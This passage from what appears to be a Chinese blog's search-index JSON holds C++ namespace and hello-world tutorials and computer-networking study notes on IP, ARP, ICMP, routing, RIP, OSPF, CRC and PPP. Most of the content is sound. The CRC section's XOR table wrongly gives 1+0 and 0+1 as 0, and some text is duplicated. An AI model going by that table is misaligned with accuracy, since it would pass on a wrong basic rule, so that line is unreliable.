namespace xiaochenyanC &#123; typedef struct student &#123; float score; &#125;student_t; &#125; namespace xiaochenyanD &#123; typedef struct student &#123; double score; &#125;student_t; &#125; //默认使用xiaochenyanC命名空间下的变量或对象,不建议这样做 using namespace xiaochenyanC;&#125;int main(int argc, char* argv[])&#123; using namespace xiaochenyanA; using namespace xiaochenyanB; using namespace xiaochenyanB::xiaochenyanC; student_t xiaoming = &#123; 100.0f &#125;; cout &lt;&lt; xiaoming.score &lt;&lt; endl; //如果命名空间中的对象冲突,需要使用命名空间名来引用对象 cout &lt;&lt; (xiaochenyanA::a = 100) &lt;&lt; endl; cout &lt;&lt; xiaochenyanA::a &lt;&lt; endl; cout &lt;&lt; xiaochenyanB::a &lt;&lt; endl; //程序暂停 cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"namespace命名空间","slug":"cpp0002-namespace命名空间","date":"2021-04-14T16:43:28.000Z","updated":"2021-04-14T18:29:40.618Z","comments":true,"path":"2021/04/15/cpp0002-namespace命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0002-namespace命名空间/","excerpt":"","text":"namespace命名空间 假如同一个公司有两个张三，当你叫张三的时候，两个张三都会回头。这就出现了二义性。 为了区分这两个张三，就引进了命名空间。 第一个张三可以叫为张三A 第二个张三可以叫为张三B 12345678910111213141516171819#include&lt;iostream&gt;//方式1，可以直接使用std内的元素using namespace std;//方式2，可以直接使用coutusing std::cout;int main(int argc, char* argv[])&#123; //方式3，通过命名空间名来引用cout std::cout; return 0;&#125; 12345678910111213141516#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; &#123; //只能在本复合语句内使用 using std::cout; &#125; cout &lt;&lt; a;//出错 return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"第一个c++程序 hello world","slug":"cpp0001第一个c-程序-hello-world","date":"2021-04-14T16:37:42.000Z","updated":"2021-04-14T16:42:43.811Z","comments":true,"path":"2021/04/15/cpp0001第一个c-程序-hello-world/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0001第一个c-程序-hello-world/","excerpt":"","text":"第一个c++程序 hello world 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; cout &lt;&lt; \"hello world\" &lt;&lt; endl; int a; cin &gt;&gt; a; return 0;&#125; cout 表示输出流，将hello world流到终端 endl 表示换行 cin 表示输入流，从键盘输入内容流到变量a中 1234if 0//可以理解为注释,编译器会忽略里面的代码endif","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"第四章网络层","slug":"计算机网络原理笔记-第四章网络层","date":"2021-04-14T15:31:49.000Z","updated":"2021-04-14T16:06:16.574Z","comments":true,"path":"2021/04/14/计算机网络原理笔记-第四章网络层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/14/计算机网络原理笔记-第四章网络层/","excerpt":"","text":"计算机网络原理笔记 第四章 网络层 网络层提供得两种服务 1.虚电路服务 2.数据包服务 虚电路服务与数据报服务的对比 网际协议 IP 1.虚拟互联网 2.IP地址 3.划分子网和构造超网 4.IP地址与硬件地址 5.ARP &amp; RARP 6.IP数据报格式 7.IP转发分组的流程 网际控制报文协议 ICMP 互联网的路由选择协议 （1）内部网关协议RIP (2)内部网关协议OSPF IP多播 网络地址转换NAT 网络层提供得两种服务 网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是网络层提供的两种服务 在计算机网络领域，网络层应该向运输层提供怎样的服务（“面向连接”还是“无连接”）曾引起了长期的争论。 争论焦点的实质就是：在计算机通信中，可靠交付应当由谁来负责？是网络还是端系统？ ？ 两种服务：网络层应该向运输层提供怎样得服务 虚电路服务 数据包服务 1.虚电路服务 面向连接的通信方式 建立虚电路(Virtual Circuit)，以保证双方通信所需的一切网络资源。 如果再使用可靠传输的网络协议，就可使所发送的分组无差错按序到达终点。 虚电路是逻辑连接 虚电路表示这只是一条逻辑上的连接，分组都沿着这条逻辑连接按照存储转发方式传送，而并不是真正建立了一条物理连接。 请注意，电路交换的电话通信是先建立了一条真正的连接。因此分组交换的虚连接和电路交换的连接只是类似，但并不完全一样。 . . 2.数据包服务 因特网采用的设计思路 网络层向上只提供简单灵活的、无连接的、尽最大努力交付的数据报服务。 网络在发送分组时不需要先建立连接。每一个分组（即 IP 数据报）独立发送，与其前后的分组无关（不进行编号）。 网络层不提供服务质量的承诺。即所传送的分组可能出错、丢失、重复和失序（不按序到达终点），当然也不保证分组传送的时限。 . . 尽最大努力交付的好处 由于传输网络不提供端到端的可靠传输服务，这就使网络中的路由器可以做得比较简单，而且价格低廉（与电信网的交换机相比较）。 如果主机（即端系统）中的进程之间的通信需要是可靠的，那么就由网络的主机中的运输层负责（包括差错处理、流量控制等）。 采用这种设计思路的好处是：网络的造价大大降低，运行方式灵活，能够适应多种应用。 因特网能够发展到今日的规模，充分证明了当初采用这种设计思路的正确性。 . . 虚电路服务与数据报服务的对比 对比的方面 虚电路服务 数据报服务 思路 可靠通信应当由网络来保证 可靠通信应当由用户主机来保证 连接的建立 必须有 不需要 终点地址 仅在连接建立阶段使用，每个分组使用短的虚电路号 每个分组都有终点的完整地址 分组的转发 属于同一条虚电路的分组均按照同一路由进行转发 每个分组独立选择路由进行转发 当结点出故障时 所有通过出故障的结点的虚电路均不能工作 出故障的结点可能会丢失分组，一些路由可能会发生变化 分组的顺序 总是按发送顺序到达终点 到达终点时不一定按发送顺序 端到端的差错处理和流量控制 可以由网络负责，也可以由用户主机负责 由用户主机负责 . . 网际协议 IP 1.虚拟互联网 网络层中间设备 中间设备又称为中间系统或中继(relay)系统。 物理层中继系统：转发器(repeater)。 数据链路层中继系统：网桥或桥接器(bridge)。 网络层中继系统：路由器(router)。 网络层以上的中继系统：网关(gateway)。 注： 现在说的网关一般指的是路由器接口，网关地址一般习惯使用本网段第一个地址或者最后一个地址 虚拟互连网络的意义 所谓虚拟互连网络也就是逻辑互连网络，它的意思就是互连起来的各种物理网络的异构性本来是客观存在的，但是我们利用 IP 协议就可以使这些性能各异的网络从用户看起来好像是一个统一的网络。 使用 IP 协议的虚拟互连网络可简称为 IP 网。 使用虚拟互连网络的好处是：当互联网上的主机进行通信时，就好像在一个网络上通信一样，而看不见互连的各具体的网络异构细节。 . . 2.IP地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 1、IP地址和子网划分学习笔记之《预备知识：进制计数》 2、IP地址和子网划分学习笔记之《IP地址详解》 3、IP地址和子网划分学习笔记之《子网掩码详解》 3.划分子网和构造超网 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 4、IP地址和子网划分学习笔记之《子网划分详解》 5、IP地址和子网划分学习笔记之《超网合并详解》 4.IP地址与硬件地址 本小节我转载了与韩老师讲解思路一致 但是总结的更详细的IP地址与划分博文合集笔记供大家阅读 点下方链接就可进入 2、IP地址和子网划分学习笔记之《IP地址详解》 . . 5.ARP &amp; RARP ARP简介 不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。 每一个主机都设有一个 ARP 高速缓存(ARP cache)，里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 当主机 A 欲向本局域网上的某个主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。 ARP高速缓存的作用 为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。 当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。 . . 使用 ARP 的四种典型情况 发送方是主机，要把IP数据报发送到本网络上的另一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。 发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。 . . 应当注意的问题 ARP 是解决同一个局域网上的主机或路由器的 IP 地址和硬件地址的映射问题。 如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做。 从IP地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。 只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。 . . 逆地址解析协议 RARP 逆地址解析协议 RARP 使只知道自己硬件地址的主机能够知道其 IP 地址。 . 6.IP数据报格式 IP数据包 一个 IP 数据包由首部和数据两部分组成。 首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。 在首部的固定部分的后面是一些可选字段，其长度是可变的。 IP 数据报首部的固定部分中的各字段 版本——占4位，指IP协议的版本，目前使用的IP协议版本号为4（即IPv4） 首部长度——占4位，课表示的最大数值 是15个单位(一个单位为4字节)，因此IP的首部长度的最大值是60字节。 区分服务——让数据包加上一个标记，来告诉网络上那些传输的数据，这些数据包在传的时候 是着急还是不着急。QOS服务质量 总长度——占16位，指首部和数据之和的长度，单位位字节，因此数据报的最大长度位65535字节。总长度必须不超过最大传送单元MTU。 标识——占16位，它是一个计数器，用老产生数据报的标识，不是序号，每产生一个数据包，就增加1。 标志——占3位，目前只有前两位有意义。标志字段的最低位是MF。 MF=1表示后面“还有分片”。MF=0表示最后一个分片。标志字段中间的一位是DF。 只有当DF=0时才允许分片。 生存时间 记位TTL （Time To Live） 占8位，数据报在网络中可通过的路由器数的最大值 数据包没过一个路由器 TTL-1 协议——协议（8位）字段指出此数据报携带的数据使用何种学语以便目的主机的IP层讲数据部分交给哪个处理 首部检验和——首部检验和(16 位)字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。 . . IP数据报首部的可变部分 IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施，内容很丰富。 选项字段的长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目。 增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。 实际上这些选项很少被使用。 . . 7.IP转发分组的流程 数据包如何路由 IP路由 路由就是路由器从一个网段到另外一个网段转发数据包的过程，即数据包通过路由器转发，就是数据路由。 网络畅通条件，要求数据包必须能够到达目标地址，同时数据包必须能够返回发送地址。 这就要求沿途经过的路由器必须知道到目标网络如何转发数据包，即到达目的网络下一跳转发给哪个路由器，也就是必须有到达目标网络的路由，沿途的路由器还必须有数据包返回所需的路由。 . 数据路由：路由器在不同网段转发数据包 网络畅通的条件：能去能回 沿途的路由器必须知道目标网络下一跳给哪个接口 沿途的路由器必须知道源网络下一跳给哪个接口 如图所示，计算机PC0 ping PC1，网络要想通，要求沿途的路由器Router0，Router1，Router2，Router3都必须有到192.168.1.0/24网络的路由，这样数据包才能到达PC1。 PC1要回应数据包给PC0，沿途所有的路由器必须有到192.168.0.0/24网络的路由，这样数据包才能回来。 . . 配置静态路由 默认路由 网络地址和子网掩码都为0，如图所示配置，这就意味着到任何网络下一跳转发给10.0.0.2。 网络地址和子网掩码均为0的路由就是默认路由。 Router(config)#ip route 0.0.0.0 0.0.0.0 10.0.0.2 . . Windows上的默认路由和网关 计算机也有路由表，我们可以在计算机上运行route print显示Windows操作系统上的路由表。 运行netstat –r也可以显示Windows操作系统上的路由表。 如图所示，给计算机配置网关就是给计算机添加默认路由。 . . 如果不配置计算机的网关，使用以下命令添加默认路由。 如图所示，去掉本地连接的网关，在命令提示符下，输入route print ，可以看到没有默认路由了，该计算机也不能访问其他网段，ping 202.99.160.68 提示“目标主机不可到达”。 . . 如图所示，在命令提示符下，输入route /?可以看到该命令的帮助。 输入route add 0.0.0.0 mask 0.0.0.0 192.168.8.1，添加默认路由。 输入route print 可以显示路由表，默认路由已经出现。 Ping 202.99.160.68 可以ping通。 . . 如图所示，内网的计算机需要配置IP地址、子网掩码和网关，网关就是Server的内网网卡的IP地址。在Server的两个连接，内网的网卡不需要配置网关，但是连接Internet的网卡需要配置默认网关。 . . 注意 IP 数据报的首部中没有地方可以用来指明“下一跳路由器的 IP 地址”。 当路由器收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的网络接口软件。 网络接口软件使用 ARP 负责将下一跳路由器的 IP 地址转换成硬件地址，并将此硬件地址放在链路层的 MAC 帧的首部，然后根据这个硬件地址找到下一跳路由器。 . . 网际控制报文协议 ICMP ICMP简介 为了提高 IP 数据报交付成功的机会，在网际层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。 ICMP 允许主机或路由器报告差错情况和提供有关异常情况的报告。 ICMP 不是高层协议，而是 IP 层的协议。 ICMP 报文作为 IP 层数据报的数据，加上数据报的首部，组成 IP 数据报发送出去。 . . ICMP报文格式 . . ICMP报文的类型 ICMP 报文的种类有两种，即 ICMP 差错报告报文和 ICMP 询问报文。 ICMP 报文的前 4 个字节是统一的格式，共有三个字段：即类型、代码和检验和。接着的 4 个字节的内容与 ICMP 的类型有关。 差错报告报文有五种：终点不可达 ，源点抑制(Source quench) ，时间超过 ，参数问题 ，改变路由（重定向）(Redirect) 询问报文有两种：回送请求和回答报文，时间戳请求和回答报文 差错报告报告报文的数据字段的内容 . . ICMP应用举例 PING 用来测试两个主机之间的连通性。 PING 使用了 ICMP 回送请求与回送回答报文。 PING 是应用层直接使用网络层 ICMP 的例子，它没有通过运输层的 TCP 或UDP。 Pathping tracert . . ping命令诊断网络故障 PING（Packet Internet Grope），因特网包探索器，用于测试网络连接量的程序。Ping发送一个ICMP回声请求消息给目的地并报告是否收到所希望的ICMP回声应答。 ping指的是端对端连通，通常用来作为可用性的检查， 但是某些病毒木马会强行大量远程执行ping命令抢占你的网络资源，导致系统变慢，网速变慢。 严禁ping入侵作为大多数防火墙的一个基本功能提供给用户进行选择。 如果你打开IE浏览器访问网站失败，你可以通过ping命令测试到Internet的网络连通，可以为你排除网络故障提供线索，下面展示ping命令返回的信息以及分析其原因。 . 目标主机不可到达 目标网络不可到达 请求超时 通过延迟评估网络带宽 . . Pathping跟踪数据包的路径 使用ping能够判断网络通还是不通，比如请求超时，你就不能判断什么位置出现的网络故障造成的请求超时。使用pathping命令能跟踪数据包的路径，能够查出故障点，并且能够计算路由器转发丢包率和链路丢包率以及延迟，据此能够判断出网络拥塞情况。 互联网的路由选择协议 路由选择协议的核心就是路由算法，一个理想的路由算法应该以下特点： 算法必须是正确的和完整的：沿着各路由表所指引的路由，分组一定能够最终到达目的网络和目的主机 算法在计算上应简单 算法应能适应通信量和网络拓扑的变化：即要有自适应性。 算法应具有稳定性 算法应该是公平的 算法应该是最佳的 路由选择包括静态和动态： 静态（非自适应路由选择）：简单和开销较小，但不能及时适应网络状态的变化，适用于简单的小网络 动态（自适应路由）：能较好地适应网络状态的变化。但实现起来较为复杂，开销比较大。 互联网才用的路由选择协议主要是自适应、分布式路由选择协议，由于以下两个原因，互联网采用分层次的路由选择协议： 互联网的规模非常大，如果让所有的路由器知道所有的网络应怎样到达，则这种路由表将非常大 许多单位不愿意外界了解自己单位网路的布局细节和本部门所采用的路由选择协议，但同时还希望连接到互联网上。 . 为此，把整个互联网划分为许多较小的自治系统AS（autonomous system）。自治系统AS是在单一技术管理下的一组路由器，这些路由器使用一种自治系统内部的路由选择协议和共同的度量。一个AS对其他AS表现出的是一个单一的和一直的路由选择策略。 这样就把路由选择协议划分为两大类： 内部网关协议IGP（Interior Gateway protocol）:也叫作域内路由选择，即在一个自治系统内部使用的路由选择协议，如RIP和OSPF协议。 外部网关协议EGP（External Gateway Protocol）：也叫作域间路由选择，若源主机和目的主机处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。 （1）内部网关协议RIP RIP是一种分布式的基于距离向量的路由选择协议。 RIP要求每一个路由器都要维护从它自己到其他每一个目的网络距离记录。 距离的定义：从一个路由器到直接连接的网络的距离定义为1/0，其中每经过一次路由器就加1，也称为“跳数”。 分布式路由的特点就是：每一个路由器都要不断地和其他一些路由器交换路由信息，周期性广播。 RIP协议的特点： 仅和相邻路由器交换信息。 路由器交换的信息使当前本路由器所知道的全部信息，即自己现在的路由表，包括到本自治网络的最短距离，以及到每个网络应经过的下一跳路由器。 按照固定的时间间隔交换路由信息。 路由器刚刚开始工作时，它的路由表是空的，经过若干次更新后，所有路由器最终都会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器的地址。 距离向量算法：找出每个目的网络的最短距离算法。 收到相邻路由器（其地址为 X）的一个 RIP 报文： (1) 先修改此 RIP 报文中的所有项目：把“下一跳”字段中的地址都改为 X，并把所有的“距离”字段的值加 1。 (2) 对修改后的 RIP 报文中的每一个项目，重复以下步骤： 若项目中的目的网络不在路由表中，则把该项目加到路由表中。 否则 ​ 若下一跳字段给出的路由器地址是同样的，则把收到的项 目 替换原路由表中的项目。 否则 ​ 若收到项目中的距离小于路由表中的距离，则进行更新， 否则，什么也不做。 (3) 若 3 分钟还没有收到相邻路由器的更新路由表，则把此相邻路由器记为不可达路由器，即将距离置为16（距离为16表示不可达）。 RIP协议的优缺点 RIP 存在的一个问题是当网络出现故障时，要经过比较长的时间才能将此信息传送到所有的路由器。 RIP 协议最大的优点就是实现简单，开销较小。 RIP 限制了网络的规模，它能使用的最大距离为 15（16 表示不可达）。 路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大，开销也就增加。 . . (2)内部网关协议OSPF OSPF 协议的基本特点 “开放”表明 OSPF 协议不是受某一家厂商控制，而是公开发表的。 “最短路径优先”是因为使用了 Dijkstra 提出的最短路径算法SPF OSPF 只是一个协议的名字，它并不表示其他的路由选择协议不是“最短路径优先”。 是分布式的链路状态协议。 . . 三个要点 向本自治系统中所有路由器发送信息，这里使用的方法是洪泛法。 发送的信息就是与本路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。 “链路状态”就是说明本路由器都和哪些路由器相邻，以及该链路的“度量”(metric)。 只有当链路状态发生变化时，路由器才用洪泛法向所有路由器发送此信息。 . . 链路状态数据库 由于各路由器之间频繁地交换链路状态信息，因此所有的路由器最终都能建立一个链路状态数据库。 这个数据库实际上就是全网的拓扑结构图，它在全网范围内是一致的（这称为链路状态数据库的同步）。 OSPF 的链路状态数据库能较快地进行更新，使各个路由器能及时更新其路由表。OSPF 的更新过程收敛得快是其重要优点。 \\ OSPF 划分为两种不同的区域 划分区域 划分区域的好处就是将利用洪泛法交换链路状态信息的范围局限于每一个区域而不是整个的自治系统，这就减少了整个网络上的通信量。 在一个区域内部的路由器只知道本区域的完整网络拓扑，而不知道其他区域的网络拓扑的情况。 OSPF 使用层次结构的区域划分。在上层的区域叫作主干区域(backbone area)。主干区域的标识符规定为0.0.0.0。主干区域的作用是用来连通其他在下层的区域。 OSPF 直接用 IP 数据报传送 OSPF 不用 UDP 而是直接用 IP 数据报传送。 OSPF 构成的数据报很短。这样做可减少路由信息的通信量。 数据报很短的另一好处是可以不必将长的数据报分片传送。分片传送的数据报只要丢失一个，就无法组装成原来的数据报，而整个数据报就必须重传。 . . OSPF 的其他特点 OSPF 对不同的链路可根据 IP 分组的不同服务类型 TOS 而设置成不同的代价。因此，OSPF 对于不同类型的业务可计算出不同的路由。 如果到同一个目的网络有多条相同代价的路径，那么可以将通信量分配给这几条路径。这叫作多路径间的负载平衡。 所有在 OSPF 路由器之间交换的分组都具有鉴别的功能。 支持可变长度的子网划分和无分类编址 CIDR。 每一个链路状态都带上一个 32 位的序号，序号越大状态就越新。 OSPF 的五种分组类型 类型1，问候(Hello)分组。 类型2，数据库描述(Database Description)分组。 类型3，链路状态请求(Link State Request)分组。 类型4，链路状态更新(Link State Update)分组， 用洪泛法对全网更新链路状态。 类型5，链路状态确认(Link State Acknowledgment) 分组。 . . OSPF 的其他特点 OSPF 还规定每隔一段时间，如 30 分钟，要刷新一次数据库中的链路状态。 由于一个路由器的链路状态只涉及到与相邻路由器的连通状态，因而与整个互联网的规模并无直接关系。因此当互联网规模很大时，OSPF 协议要比距离向量协议 RIP 好得多。 OSPF 没有“坏消息传播得慢”的问题，据统计，其响应网络变化的时间小于 100 ms。 IP多播 网络地址转换NAT","categories":[{"name":"计算机网络原理","slug":"计算机网络原理","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络原理/"}],"tags":[]},{"title":"第三章 数据链路层","slug":"计算机网络原理笔记-第三章-数据链路层","date":"2021-03-31T16:50:41.000Z","updated":"2021-03-31T18:00:00.421Z","comments":true,"path":"2021/04/01/计算机网络原理笔记-第三章-数据链路层/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/01/计算机网络原理笔记-第三章-数据链路层/","excerpt":"","text":"计算网络原理 第三章 数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 3.1.2 三个基本问题 数据链路层的信道类型 3.2 点对点协议 PPP 3.2.1 PPP协议的特点 3.2.2 PPP协议的帧格式 3.2.3 PPP协议的工作状态 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 数据链路层（一） 3.1 使用点对点信道的数据链路层 3.1.1 数据链路层和帧 *数据发送模型* *数据链路层的信道类型* 数据链路层使用的信道主要有以下两种类型： 点对点信道。这种信道使用一对一的点对点通信方式。 广播信道。这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发送。 . . 链路与数据链路 **链路(link)**是一条无源的点到点的物理线路段，中间没有任何其他的交换结点。 一条链路只是一条通路的一个组成部分。 数据链路(data link) 除了物理线路外，还必须有通信协议来控制这些数据的传输。若把实现这些协议的硬件和软件加到链路上，就构成了数据链路。 现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。 一般的适配器都包括了数据链路层和物理层这两层的功能。 帧 数据链路层传送的是帧 . . 3.1.2 三个基本问题 1.封装成帧 封装成帧(framing) 就是在一段数据的前后分别添加首部和尾部，然后就构成了一个帧。确定帧的界限。 首部和尾部的一个重要作用就是进行帧定界。 用控制字符进行帧定界的方法举例 试想：帧还未发送完，发送端出了问题，只能重发该帧。接收端却收到了前面的“半截子帧”，它会抛弃吗？为什么？ 2.透明传输 若传输的数据是ASCII码中“可打印字符(共95个)“集时，一切正常。 若传输的数据不是仅由”可打印字符”组成时，就会出问题，如下 用字节填充法解决透明传输问题 发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入一个转义字符“ESC”(其十六进制编码是 1B)。 字节填充(byte stuffing)或字符填充(character stuffing)——接收端的数据链路层在将数据送往网络层之前删除插入的转义字符。 如果转义字符也出现数据当中，那么应在转义字符前面插入一个转义字符。当接收端收到连续的两个转义字符时，就删除其中前面的一个。 当传送的帧是用文本文件组成的帧时（文本文件中的字都是从键盘上输入的），其数据部分显然不会出现像SOH或EOT这样的帧定界控制字符。可见不管从键盘上输入什么字符都可以放在这样的帧中传输过去，因此这样的传输就是透明传输。 . . 3.差错控制 在传输过程中可能会产生比特差错：1 可能会变成 0 而 0 也可能变成 1。 在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率 BER (Bit Error Rate)。 误码率与信噪比有很大的关系。 为了保证数据传输的可靠性，在计算机网络传输数据时，必须采用各种差错检测措施。 循环冗余检验的原理 在数据链路层传送的帧中，广泛使用了循环冗余检验 CRC 的检错技术。 在发送端，先把数据划分为组。假定每组 k 个比特。 假设待传送的一组数据 M = 101001（现在 k = 6）。我们在 M 的后面再添加供差错检测用的 n 位冗余码一起发送。 冗余码的计算 用二进制的模 2 运算进行 2n 乘 M 的运算，这相当于在 M 后面添加 n 个 0。 得到的 (k + n) 位的数除以事先选定好的长度为 (n + 1) 位的除数 P，得出商是 Q 而余数是 R，余数 R 比除数 P 少1 位，即 R 是 n 位。 冗余码的计算举例 现在 k = 6, M = 101001。 设 n = 3, 除数 P = 1101， 被除数是 2n**M = 101001000。 模 2 运算的结果是：商 Q = 110101， 余数 R = 001。 把余数 R 作为冗余码添加在数据 M 的后面发送出去。发送的数据是：2n**M + R 即：101001001，共 (k + n) 位。 循环冗余检验的原理说明 帧检验序列 FCS 在数据后面添加上的冗余码称为帧检验序列 FCS (Frame Check Sequence)。 循环冗余检验 CRC 和帧检验序列 FCS并不等同。 CRC 是一种常用的检错方法，而 FCS 是添加在数据后面的冗余码。 FCS 可以用 CRC 这种方法得出，但 CRC 并非用来获得 FCS 的唯一方法。 接收端对收到的每一帧进行 CRC 检验 (1) 若得出的余数 R = 0，则判定这个帧没有差错，就接受(accept)。 (2) 若余数 R ≠ 0，则判定这个帧有差错，就丢弃。 但这种检测方法并不能确定究竟是哪一个或哪几个比特出现了差错。 只要经过严格的挑选，并使用位数足够多的除数 P，那么出现检测不到的差错的概率就很小很小。 补零位数比除数位数少一 异或运算 1+1=0 1+0=0 0+1=0 0+0=0 除数由两台计算机数据链路层协议决定 *小结：CRC差错检测技术* 仅用循环冗余检验 CRC 差错检测技术只能做到无差错接受(accept)。 “无差错接受”是指：“凡是接受的帧（即不包括丢弃的帧），我们都能以非常接近于 1 的概率认为这些帧在传输过程中没有产生差错”。也就是说：“凡是接收端数据链路层接受的帧都没有传输差错”（有差错的帧就丢弃而不接受）。 要做到“可靠传输”（即发送什么就收到什么）就必须再加上确认和重传机制。 考虑：帧重复、帧丢失、帧乱序的情况 可以说“CRC是一种无比特差错，而不是无传输差错的检测机制” OSI/RM模型的观点:数据链路层要做成无传输差错的!但这种理念目前不被接受。 . . . 数据链路层的信道类型 •数据链路层使用的信道主要有以下两种类型： 点对点信道。 这种信道使用一对一的点对点通信方式。 广播信道。 这种信道使用一对多的广播通信方式，因此过程比较复杂。广播信道上连接的主机很多，因此必须使用专用的共享信道协议来协调这些主机的数据发。 . · 3.2 点对点协议 PPP 现在全世界使用得最多的数据链路层协议是点对点协议 PPP (Point-to-Point Protocol)。 用户使用拨号电话线接入因特网时，一般都是使用 PPP 协议。 用户到 ISP 的链路使用 PPP 协议 3.2.1 PPP协议的特点 PPP 协议应满足的需求 简单——这是首要的要求 封装成帧 透明性 多种网络层协议 多种类型链路 差错检测 检测连接状态 最大传送单元 网络层地址协商 数据压缩协商 · PPP 协议不需要的功能 纠错 流量控制 序号 多点线路 半双工或单工链路 PPP 协议的组成 1992 年制订了 PPP 协议。经过 1993 年和 1994 年的修订，现在的 PPP 协议已成为因特网的正式标准[RFC 1661]。 PPP 协议有三个组成部分 一个将 IP 数据报封装到串行链路的方法。 链路控制协议 LCP (Link Control Protocol)。 网络控制协议 NCP (Network Control Protocol)。 . . 3.2.2 PPP协议的帧格式 标志字段 F = 0x7E （符号“0x”表示后面的字符是用十六进制表示。十六进制的 7E 的二进- - 制表示是 01111110）。 地址字段 A 只置为 0xFF。地址字段实际上并不起作用。 控制字段 C 通常置为 0x03。 PPP 是面向字节的，所有的 PPP 帧的长度都是整数字节。 透明传输问题 当 PPP 用在同步传输链路时，协议规定采用硬件来完成比特填充（和 HDLC 的做法一样）。 当 PPP 用在异步传输时，就使用一种特殊的 字符填充法 。 字符填充 将信息字段中出现的每一个 0x7E 字节转变成为 2 字节序列(0x7D, 0x5E)。 若信息字段中出现一个 0x7D 的字节, 则将其转变成为 2 字节序列(0x7D, 0x5D)。 若信息字段中出现 ASCII 码的控制字符（即数值小于 0x20 的字符），则在该字符前面要加入一个 0x7D 字节，同时将该字符的编码加以改变。 . 零比特填充 PPP 协议用在 SONET/SDH 链路时，是使用同步传输（一连串的比特连续传送）。这时 PPP 协议采用零比特填充方法来实现透明传输。 在发送端，只要发现有 5 个连续 1，则立即填入一个 0。接收端对帧中的比特流进行扫描。每当发现 5 个连续1时，就把这 5 个连续 1 后的一个 0 删除。 . . 不提供使用序号和确认 的可靠传输 PPP 协议之所以不使用序号和确认机制是出于以下的考虑： 在数据链路层出现差错的概率不大时，使用比较简单的 PPP 协议较为合理。 在因特网环境下，PPP 的信息字段放入的数据是 IP 数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。 帧检验序列 FCS 字段可保证无差错接受。 . . 3.2.3 PPP协议的工作状态 当用户拨号接入 ISP 时，路由器的调制解调器对拨号做出确认，并建立一条物理连接。 PC 机向路由器发送一系列的 LCP 分组（封装成多个 PPP 帧）。 这些分组及其响应选择一些 PPP 参数，和进行网络层配置，NCP 给新接入的 PC机分配一个临时的 IP 地址，使 PC 机成为因特网上的一个主机。 通信完毕时，NCP 释放网络层连接，收回原来分配出去的 IP 地址。接着，LCP 释放数据链路层连接。最后释放的是物理层的连接。 . . 3.3 使用广播信道的数据链路层(局域网) 3.3.1 局域网的数据链路层 局域网最主要的特点是：网络为一个单位所拥有，且地理范围和站点数目均有限。 局域网具有如下的一些主要优点： 具有广播功能，从一个站点可很方便地访问全网。局域网上的主机可共享连接在局域网上的各种硬件和软件资源。 便于系统的扩展和逐渐地演变，各设备的位置可灵活调整和改变。 